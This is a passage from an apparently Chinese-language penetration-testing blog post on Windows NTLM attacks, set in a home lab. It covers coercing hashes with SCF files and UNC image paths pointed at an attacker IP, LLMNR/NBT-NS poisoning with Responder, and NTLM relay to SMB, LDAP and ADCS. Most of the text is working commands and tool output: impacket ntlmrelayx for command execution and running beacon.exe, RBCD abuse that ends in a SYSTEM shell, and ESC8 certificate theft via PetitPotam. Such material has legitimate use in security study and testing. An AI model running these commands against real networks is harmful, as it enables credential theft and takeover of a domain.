class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;&quot;\\\\172.16.100.1\\outlook&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>desktop.ini文件</strong></p>\n<p>当更改文件夹图标时会生成desktop.ini，修改 IconResource路径</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511223658508.png\" alt=\"image-20250511223658508\"></p>\n<p><strong>SCF文件</strong></p>\n<p>只要一个文件底下含有scf后缀的文件,由于scf文件包含了IconFile属性，所以Explore.exe会尝试获取文件的图标</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Shell]</span><br><span class=\"line\">Command&#x3D;2</span><br><span class=\"line\">IconFile&#x3D;\\\\192.168.100.133\\scf\\test.ico</span><br><span class=\"line\">[Taskbar]</span><br><span class=\"line\">Command&#x3D;ToggleDesktop</span><br></pre></td></tr></table></figure>\n\n<p>写入到test.scf并放到某文件夹下，访问文件夹</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511225259723.png\" alt=\"image-20250511225259723\"></p>\n<h2 id=\"网络欺骗\"><a href=\"#网络欺骗\" class=\"headerlink\" title=\"网络欺骗\"></a>网络欺骗</h2><p><strong>LLMNR/NBT-NS/(M)DNS Poisoning</strong></p>\n<p>链路本地多播名称解析（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解析为同一本地链路上的主机。当局域网中的DNS服务器不可用时，DNS客户端会使用LLMNR本地链路多播名称解析来解析本地网段上的主机的名称，直到网络连接恢复正常为止。</p>\n<p>Windows系统名称解析顺序：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">本地缓存</span><br><span class=\"line\">Hosts文件</span><br><span class=\"line\">DNS服务器</span><br><span class=\"line\">NBNS (NetBIOS Name Service)广播</span><br><span class=\"line\">LLMNR &#x2F; mDNS (局域网名解析)</span><br></pre></td></tr></table></figure>\n\n<p>当用户输入 不存在、包含错误、DNS中没有的主机名 时，主机先在自己的内部名称缓存中查询名称，如果没找到，主机就会向DNS服务器查询，而DNS解析会失败，此时就会退回LLMNR和NetBIOS进行对链路内存在的主机进行广播查询。那么攻击者就能够代替网络上任何不存在的主机回答请求，并诱导搜索内容的主机连接到我们。如果攻击者使用 Responder 等工具，就可以要求验证受害者主机的身份，而如果攻击者被认为是这些主机所在的本地网络中的一部分时，他们就会把自己进行哈希后的Windows凭据发给攻击者。</p>\n<p>受害机以本地管理员Administrator 访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\\\whatevers</span><br></pre></td></tr></table></figure>\n\n<p>攻击机 -A 参数会分析 LLMNR 和 NBT-NS 请求有哪些机器被欺骗到</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">responder -I eth1 -A</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824233010762.png\" alt=\"image-20250824233010762\"></p>\n<p>去除-A参数，重新欺骗</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">responder -I eth1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824233630498.png\" alt=\"image-20250824233630498\"></p>\n<h1 id=\"Net-NTLM-hash利用\"><a href=\"#Net-NTLM-hash利用\" class=\"headerlink\" title=\"Net-NTLM hash利用\"></a>Net-NTLM hash利用</h1><p>利用主要分为两部分：</p>\n<ul>\n<li>Relay 到其他机器</li>\n<li>Relay 到自己，即 NTLM Reflect</li>\n</ul>\n<h2 id=\"签名扫描\"><a href=\"#签名扫描\" class=\"headerlink\" title=\"签名扫描\"></a>签名扫描</h2><p>Relay前进行 签名信息的扫描 还是比较重要的，不然失败都不知道原因</p>\n<p>cme/nxc：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">crackMapExec&#x2F;netexec smb 192,168.100.130</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824234703206.png\" alt=\"image-20250824234703206\"></p>\n<p>PsMapExec</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PsMapExec -Targets all -Method GenRelayList</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250831224959923.png\" alt=\"image-20250831224959923\"></p>\n<p>RunFinger：responder下脚本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 不知为何 DC 没扫出来签名</span><br><span class=\"line\">┌──(root㉿kali)-[&#x2F;usr&#x2F;share&#x2F;responder&#x2F;tools]</span><br><span class=\"line\">└─# python3 RunFinger.py -f &#x2F;home&#x2F;h4ck&#x2F;Desktop&#x2F;ips.txt</span><br><span class=\"line\"></span><br><span class=\"line\">[SMB2]:[&#39;192.168.100.128&#39;, Os:&#39;Windows 8.1&#x2F;Server 2012R2&#39;, Build:&#39;9600&#39;, Domain:&#39;TEST&#39;, Bootime: &#39;2025-01-29 02:02:12&#39;, Signing:&#39;False&#39;, RDP:&#39;False&#39;, SMB1:&#39;True&#39;, MSSQL:&#39;False&#39;]</span><br><span class=\"line\">[SMB2]:[&#39;192.168.100.130&#39;, Os:&#39;Windows 7&#x2F;Server 2008R2&#39;, Build:&#39;7601&#39;, Domain:&#39;TEST&#39;, Bootime: &#39;2025-08-17 05:40:33&#39;, Signing:&#39;False&#39;, RDP:&#39;False&#39;, SMB1:&#39;True&#39;, MSSQL:&#39;False&#39;]</span><br><span class=\"line\">[SMB2]:[&#39;192.168.100.131&#39;, Os:&#39;Windows 10&#x2F;Server 2016&#x2F;2019 (check build)&#39;, Build:&#39;17763&#39;, Domain:&#39;TEST&#39;, Bootime: &#39;Unknown&#39;, Signing:&#39;False&#39;, RDP:&#39;False&#39;, SMB1:&#39;False&#39;, MSSQL:&#39;True&#39;]</span><br></pre></td></tr></table></figure>\n\n<p>LdapRelayScan：<a href=\"https://github.com/zyn3rgy/LdapRelayScan\">https://github.com/zyn3rgy/LdapRelayScan</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 LdapRelayScan.py -method BOTH -dc-ip 192.168.100.128 -u tom -p Ab123456</span><br><span class=\"line\"></span><br><span class=\"line\">Domain Controllers identified~</span><br><span class=\"line\">   dc-1.test.com</span><br><span class=\"line\"></span><br><span class=\"line\">~Checking DCs for LDAP NTLM relay protections~</span><br><span class=\"line\">   dc-1.test.com</span><br><span class=\"line\">      [+] (LDAP)  SERVER SIGNING REQUIREMENTS NOT ENFORCED! </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NTLM-Relay-1\"><a href=\"#NTLM-Relay-1\" class=\"headerlink\" title=\"NTLM Relay\"></a>NTLM Relay</h2><p>下面的各种Relay2 都是展示了将流量中继到不同协议的怎么利用思路：中继到不同协议能干什么事情。关于 Relay 的利用工具，基本会用到这几个</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">smbrelayx.py - impacket</span><br><span class=\"line\">ntlmrelayx.py - impacket</span><br><span class=\"line\">MultiRelay.py - responder</span><br></pre></td></tr></table></figure>\n\n<p>实验机器：</p>\n<p>kali - 192.168.100.133</p>\n<p>DC - 192.168.100.128</p>\n<p>win7 - 192.168.100.130</p>\n<p>2019 - 192.168.100.131</p>\n<h3 id=\"Relay2SMB\"><a href=\"#Relay2SMB\" class=\"headerlink\" title=\"Relay2SMB\"></a>Relay2SMB</h3><p>SMB 中继是最直接最有效的方法 (包括但不限于执行命令、上传执行exe、dump hash等)，但是SMB是需要看发起请求账号的权限，比如普通域用户A一般情况没有对机器B具有管理权限，因此无法通过relay去横向B</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 命令执行</span><br><span class=\"line\">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -c whoami</span><br><span class=\"line\"></span><br><span class=\"line\"># 远程导SAM dump local hash</span><br><span class=\"line\">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\"># interactive shell</span><br><span class=\"line\">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -i</span><br><span class=\"line\"></span><br><span class=\"line\"># execute EXE</span><br><span class=\"line\">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -e beacon.exe</span><br><span class=\"line\"></span><br><span class=\"line\"># 批量 relay</span><br><span class=\"line\">impacket-ntlmrelayx -tf ips.txt -of res.txt --no-http-server --no-wcf-server --no-raw-server -smb2support</span><br><span class=\"line\"></span><br><span class=\"line\"># socks代理，中继成功就会在本地 1080 监听端口自动维持会话有效性</span><br><span class=\"line\">impacket-ntlmrelayx -t smb:&#x2F;&#x2F;&lt;target&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support -socks</span><br><span class=\"line\">proxychains impacket-secretsdump test.com&#x2F;Administrator@192.168.100.130</span><br></pre></td></tr></table></figure>\n\n<p>对目标机器有管理权限的账户（域管）对kali发起请求</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Administrator\\Desktop&gt;net use \\\\192.168.100.133</span><br><span class=\"line\">发生系统错误 58。</span><br><span class=\"line\"></span><br><span class=\"line\">指定的服务器无法运行请求的操作。</span><br></pre></td></tr></table></figure>\n\n<p>kali realy 到域内win7，命令执行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250831232837026.png\" alt=\"image-20250831232837026\"></p>\n<p>无管理权限用户发起请求情况：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 普通域用户</span><br><span class=\"line\">└─$ impacket-ntlmrelayx -t smb:&#x2F;&#x2F;192.168.100.130 --no-http-server --no-wcf-server --no-raw-server -smb2support -c hostname</span><br><span class=\"line\">...</span><br><span class=\"line\">[*] Setting up SMB Server on port 445</span><br><span class=\"line\">[*] Multirelay disabled</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Servers started, waiting for connections</span><br><span class=\"line\">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.131, attacking target smb:&#x2F;&#x2F;192.168.100.130</span><br><span class=\"line\">[*] Authenticating against smb:&#x2F;&#x2F;192.168.100.130 as TEST.COM&#x2F;TOM SUCCEED</span><br><span class=\"line\">[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class=\"line\">[*] All targets processed!</span><br><span class=\"line\"></span><br><span class=\"line\"># 2019 本地管理员</span><br><span class=\"line\">└─$ impacket-ntlmrelayx -t smb:&#x2F;&#x2F;192.168.100.130 --no-http-server --no-wcf-server --no-raw-server -smb2support -c hostname</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\">...</span><br><span class=\"line\">[*] Setting up SMB Server on port 445</span><br><span class=\"line\">[*] Multirelay disabled</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Servers started, waiting for connections</span><br><span class=\"line\">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.131, attacking target smb:&#x2F;&#x2F;192.168.100.130</span><br><span class=\"line\">[-] Authenticating against smb:&#x2F;&#x2F;192.168.100.130 as MSSQL&#x2F;ADMINISTRATOR FAILED</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"Relay2LDAP\"><a href=\"#Relay2LDAP\" class=\"headerlink\" title=\"Relay2LDAP\"></a>Relay2LDAP</h3><p>LDAP利用方式就很多，而且可以很好的搭配强制认证（机器用户也是域内用户），其利用方式大概如下：</p>\n<ul>\n<li><p>域内信息收集</p>\n</li>\n<li><p>高权限用户组拉任意用户进组</p>\n</li>\n<li><p>acl权限操纵</p>\n</li>\n<li><p>配置RBCD</p>\n</li>\n<li><p>shadow credentials 权限维持</p>\n</li>\n<li><p>创建用户</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># ntlmrelayx 关于LDAP</span><br><span class=\"line\">LDAP client options:</span><br><span class=\"line\">  --no-dump             Do not attempt to dump LDAP information</span><br><span class=\"line\">  --no-da               Do not attempt to add a Domain Admin</span><br><span class=\"line\">  --no-acl              Disable ACL attacks</span><br><span class=\"line\">  --no-validate-privs   Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks</span><br><span class=\"line\">  --escalate-user ESCALATE_USER</span><br><span class=\"line\">                        Escalate privileges of this user instead of creating a new one</span><br><span class=\"line\">  --delegate-access     Delegate access on relayed computer account to the specified account</span><br><span class=\"line\">  --sid                 Use a SID to delegate access rather than an account name</span><br><span class=\"line\">  --dump-laps           Attempt to dump any LAPS passwords readable by the user</span><br><span class=\"line\">  --dump-gmsa           Attempt to dump any gMSA passwords readable by the user</span><br><span class=\"line\">  --dump-adcs           Attempt to dump ADCS enrollment services and certificate templates info</span><br><span class=\"line\">  --add-dns-record NAME IPADDR</span><br><span class=\"line\">                        Add the &lt;NAME&gt; record to DNS via LDAP pointing to &lt;IPADDR&gt;</span><br><span class=\"line\">  --add-computer [COMPUTERNAME [PASSWORD ...]]</span><br><span class=\"line\">                        Attempt to add a new computer account via SMB or LDAP, depending on the specified target. This argument can be used either with the LDAP or the SMB service, as long as the target is a domain controller.</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p><strong>域内信息收集</strong>（实验环境没有HTTP，因此采用 强制认证 + CVE-2019-1040 来忽略SMB到LDAP的签名问题）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --no-da --no-acl --no-validate-privs --remove-mic</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250901013522112.png\" alt=\"image-20250901013522112\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250901013559710.png\" alt=\"image-20250901013559710\"></p>\n<hr>\n<p><strong>高权限用户组拉任意用户进组</strong>（实验环境没有HTTP，因此采用 CVE-2019-1040 来忽略SMB到LDAP的签名问题）</p>\n<p>如果发起NTLM的用户在以下用户组，那么就可以将任意用户拉进该组，从而使该用户变为高权限用户</p>\n<ul>\n<li>Enterprise admins</li>\n<li>Domain admins</li>\n<li>Built-in Administrators</li>\n<li>Backup operators</li>\n<li>Account operators</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-acl --escalate-user zhangsan</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902223511383.png\" alt=\"image-20250902223511383\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902223546989.png\" alt=\"image-20250902223546989\"></p>\n<hr>\n<p><strong>ACL权限操纵</strong></p>\n<p>关于ACL的提权利用：如果发起者有 Write-ACL权限，那么就可以在以下两条ACE中添加任意用户，从而使得被添加用户可以具备 dcsync 的权限。</p>\n<ul>\n<li><p><strong>DS-Replication-GetChanges（GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2）</strong></p>\n</li>\n<li><p><strong>DS-Replication-Get-Changes-All（GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2）</strong></p>\n</li>\n</ul>\n<p>常见利用：</p>\n<ul>\n<li>强制Exchange认证：<strong>Exchange机器用户</strong> 在 <strong>Exchange Trusted Subsystem</strong> Group 中，该Group在 <strong>Exchange Windows Permissions</strong> 中，<strong>这两个Group具有Write-ACL权限！</strong></li>\n<li>强制认证方式可以有：CVE-2018-8581（PrivExchange）、PetitPotam等</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># --no-validate-privs 添加选项则只进行ACL attack</span><br><span class=\"line\">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-validate-privs --escalate-user zhangsan</span><br></pre></td></tr></table></figure>\n\n<p>关于以上两种攻击，简单分析下ntlmrelayx源码。通过选项配置LDAP</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012234066.png\" alt=\"image-20250902012234066\"></p>\n<p>在 ldapattack.py 的 run() 中，首先检查发起relay用户的权限，检查三种：创建用户、高权限组、修改ACL权限</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012440820.png\" alt=\"image-20250902012440820\"></p>\n<p>如果权限、选项参数通过，尝试ACL攻击，为 <code>--escalate-user</code> 指定的用户或者新创建用户添加ACE权限</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012727180.png\" alt=\"image-20250902012727180\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012845542.png\" alt=\"image-20250902012845542\"></p>\n<p>接下来权限、选项参数通过，尝试高权限组用户攻击</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902012953714.png\" alt=\"image-20250902012953714\"></p>\n<p>添加用户到高权限组中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250902013324023.png\" alt=\"image-20250902013324023\"></p>\n<hr>\n<p><strong>配置RBCD</strong>（采用 CVE-2019-1040 来忽略SMB到LDAP的签名问题）</p>\n<p>这一块看了《Kerberos委派攻击》就比较熟悉了，通过 Relay + 通过LDAP配置RBCD属性 实现域内提权、横向移动</p>\n<blockquote>\n<p>本地实验1：通过 匿名强制认证 + Relay 添加机器账户并添加委派，实现 无域内凭证横向到域内机器 - 失败</p>\n<p>PetitPotam 在2008、2012低版本环境下可无需用户匿名触发</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;DC&gt; --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-da --no-acl --no-validate-privs --delegate-access</span><br></pre></td></tr></table></figure>\n\n<p>报错原因：某些类型的操作（查找敏感属性&lt;托管账户的密码&gt;、某些修改操作&lt;创建机器账户&gt;）需要加密连接（使用 TLS 或 LDAP 封装），解决：通过HTTP relay，使用 StartTLS 绕过 LDAP 通道绑定<a href=\"https://github.com/fortra/impacket/pull/1305\">^4</a></p>\n <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] Servers started, waiting for connections</span><br><span class=\"line\">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.130, attacking target ldap:&#x2F;&#x2F;192.168.100.128</span><br><span class=\"line\">[*] Authenticating against ldap:&#x2F;&#x2F;192.168.100.128 as TEST&#x2F;WIN7$ SUCCEED</span><br><span class=\"line\">[*] Assuming relayed user has privileges to escalate a user via ACL attack</span><br><span class=\"line\">[*] Adding a machine account to the domain requires TLS but ldap:&#x2F;&#x2F; scheme provided. Switching target to LDAPS via StartTLS</span><br><span class=\"line\">Exception in thread Thread-3:</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.11&#x2F;threading.py&quot;, line 1045, in _bootstrap_inner</span><br><span class=\"line\">    self.run()</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;examples&#x2F;ntlmrelayx&#x2F;attacks&#x2F;ldapattack.py&quot;, line 1119, in run</span><br><span class=\"line\">    self.addComputer(computerscontainer, domainDumper)</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;impacket&#x2F;examples&#x2F;ntlmrelayx&#x2F;attacks&#x2F;ldapattack.py&quot;, line 139, in addComputer</span><br><span class=\"line\">    if not self.client.start_tls():</span><br><span class=\"line\">           ^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;ldap3&#x2F;core&#x2F;connection.py&quot;, line 1314, in start_tls</span><br><span class=\"line\">    if self.server.tls.start_tls(self) and self.strategy.sync:  # for asynchronous connections _start_tls is run by the strategy</span><br><span class=\"line\">       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class=\"line\">  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;ldap3&#x2F;core&#x2F;tls.py&quot;, line 277, in start_tls</span><br><span class=\"line\">    raise LDAPStartTLSError(connection.last_error)</span><br><span class=\"line\">ldap3.core.exceptions.LDAPStartTLSError: startTLS failed - unavailable</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>本地实验2：通过 强制认证 + Relay 添加机器账户并添加委派，实现横向到域内机器win7</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 添加机器用户</span><br><span class=\"line\">$ impacket-addcomputer -computer-name &#39;TEST&#39; -computer-pass 123456 -dc-host DC-1.test.com -dc-ip 192.168.100.128 test.com&#x2F;tom:Ab123456</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully added machine account TEST$ with password 123456.</span><br><span class=\"line\"></span><br><span class=\"line\"># Relay</span><br><span class=\"line\">$ impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;192.168.100.128 --no-http-server --no-wcf-server --no-raw-server -smb2support --remove-mic --no-dump --no-da --no-acl --no-validate-privs --delegate-access --escalate-user &#39;TEST$&#39;</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[*] Protocol Client SMTP loaded..</span><br><span class=\"line\">[*] Protocol Client SMB loaded..</span><br><span class=\"line\">[*] Protocol Client RPC loaded..</span><br><span class=\"line\">[*] Protocol Client IMAP loaded..</span><br><span class=\"line\">[*] Protocol Client IMAPS loaded..</span><br><span class=\"line\">[*] Protocol Client DCSYNC loaded..</span><br><span class=\"line\">[*] Protocol Client MSSQL loaded..</span><br><span class=\"line\">[*] Protocol Client HTTP loaded..</span><br><span class=\"line\">[*] Protocol Client HTTPS loaded..</span><br><span class=\"line\">[*] Protocol Client LDAP loaded..</span><br><span class=\"line\">[*] Protocol Client LDAPS loaded..</span><br><span class=\"line\">[*] Running in relay mode to single host</span><br><span class=\"line\">[*] Setting up SMB Server on port 445</span><br><span class=\"line\">[*] Multirelay disabled</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Servers started, waiting for connections</span><br><span class=\"line\">[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.100.130, attacking target ldap:&#x2F;&#x2F;192.168.100.128</span><br><span class=\"line\">[*] Authenticating against ldap:&#x2F;&#x2F;192.168.100.128 as TEST&#x2F;WIN7$ SUCCEED</span><br><span class=\"line\">[*] Assuming relayed user has privileges to escalate a user via ACL attack</span><br><span class=\"line\">[*] Delegation rights modified succesfully!</span><br><span class=\"line\">[*] TEST$ can now impersonate users on WIN7$ via S4U2Proxy</span><br><span class=\"line\"></span><br><span class=\"line\"># 申请 ST</span><br><span class=\"line\">$ impacket-getST -dc-ip 192.168.100.128 -spn cifs&#x2F;win7.test.com -impersonate Administrator test.com&#x2F;&#39;TEST$&#39;:123456</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[-] CCache file is not found. Skipping...</span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_win7.test.com@TEST.COM.ccache</span><br><span class=\"line\"></span><br><span class=\"line\"># PTT</span><br><span class=\"line\">$ export KRB5CCNAME&#x3D;Administrator@cifs_win7.test.com@TEST.COM.ccache</span><br><span class=\"line\">$ impacket-smbexec -dc-ip 192.168.100.128 -k -no-pass Administrator@win7.test.com</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class=\"line\"></span><br><span class=\"line\">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class=\"line\">C:\\Windows\\system32&gt;hostname</span><br><span class=\"line\">win7</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Windows\\system32&gt;whoami</span><br><span class=\"line\">nt authority\\system</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p><strong>Shadow Credentials</strong></p>\n<p><a href=\"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab\">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover</a></p>\n<h3 id=\"Relay2ADCS\"><a href=\"#Relay2ADCS\" class=\"headerlink\" title=\"Relay2ADCS\"></a>Relay2ADCS</h3><p>ADCS中的Relay称为ESC8，原理为：ADCS的http证书接口允许通过NTLM身份验证，未但是启用NTLM中继保护，因此攻击者可以利用NTLM Relay攻击ADCS证书服务。攻击者可以在一个默认安装了证书web服务的域环境中，使用普通用户凭据，直接获取到域管权限。</p>\n<p>定位CA</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certutil.exe</span><br><span class=\"line\">certutil.exe -ca</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903022636631.png\" alt=\"image-20250903022636631\"></p>\n<p>探测CA的http</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http:&#x2F;&#x2F;ca.purple.lab&#x2F;certsrv&#x2F; -I</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903022847139.png\" alt=\"image-20250903022847139\"></p>\n<p>ntlmrelayx监听</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-ntlmrelayx -t http:&#x2F;&#x2F;ca.purple.lab&#x2F;certsrv&#x2F;certfnsh.asp -smb2support --adcs --template DomainController</span><br></pre></td></tr></table></figure>\n\n<p>强制域控认证</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-PetitPotam -d purple.lab -u pentestlab -p Password1234 &lt;attack&gt; &lt;DC&gt;</span><br></pre></td></tr></table></figure>\n\n<p>会获得DC的Base64格式的证书</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903023606370.png\" alt=\"image-20250903023606370\"></p>\n<p>通过Rubeus导入证书，申请票据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Rubeus.exe asktgt &#x2F;user:DC$ &#x2F;certificate:&lt;base64-certificate&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250903023915267.png\" alt=\"image-20250903023915267\"></p>\n<p>或者使用impacket</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 支持 PKINIT 协议</span><br><span class=\"line\">cat base64.txt | base64 -d &gt; dc01.pfx</span><br><span class=\"line\">python3 gettgtpkinit.py -cert-pfx dc01.pfx hack.lab&#x2F;DC01$ dc01.ccache</span><br><span class=\"line\">export KRB5CCNAME&#x3D;dc01.ccache</span><br><span class=\"line\"></span><br><span class=\"line\"># 不支持 PKINIT 协议</span><br><span class=\"line\">&#x2F;&#x2F; 提取密钥与证书</span><br><span class=\"line\">certipy cert -pfx NoPKI02.pfx -nokey -out NoPKI02.crt</span><br><span class=\"line\">certipy cert -pfx NoPKI02.pfx -nocert -out NoPKI02.key</span><br><span class=\"line\">&#x2F;&#x2F; 创建机器用户</span><br><span class=\"line\">python3 passthecert.py -action add_computer -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -computer-name NoPKI02$ -computer-pass 123.com</span><br><span class=\"line\">&#x2F;&#x2F; 配置域控RBCD</span><br><span class=\"line\">python3 passthecert.py -action write_rbcd -crt NoPKI02.crt -key NoPKI02.key -domain hack.lab -dc-ip 20.20.20.5 -delegate-from NoPKI02$ -delegate-to DC01$</span><br><span class=\"line\">&#x2F;&#x2F; PTT</span><br><span class=\"line\">python3 getST.py -spn cifs&#x2F;DC01.hack.lab -impersonate administrator 